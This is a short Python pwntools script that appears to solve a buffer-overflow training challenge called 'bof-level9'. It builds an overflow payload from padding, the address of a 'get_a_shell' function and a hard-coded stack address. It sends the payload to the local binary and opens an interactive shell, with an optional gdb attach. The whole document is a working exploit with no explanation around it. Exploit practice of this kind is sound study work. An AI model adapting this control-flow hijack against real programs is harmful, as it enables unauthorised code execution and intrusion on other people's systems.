#!/usr/bin/env python
import sys

from pwn import *

context.terminal = "/bin/bash"

file_name = "bof-level9"

e = ELF(file_name)

get_a_shell = e.symbols['get_a_shell']

buf = 'A' * 4 + p32(get_a_shell)
buf += 'B' * 0x74 + p32(0xffffd4a0) + 'BBBB'

p = process(file_name)

if (len(sys.argv) > 1 and sys.argv[1] == 'g'):
    gdb.attach(p)

p.sendline(buf)

p.interactive()

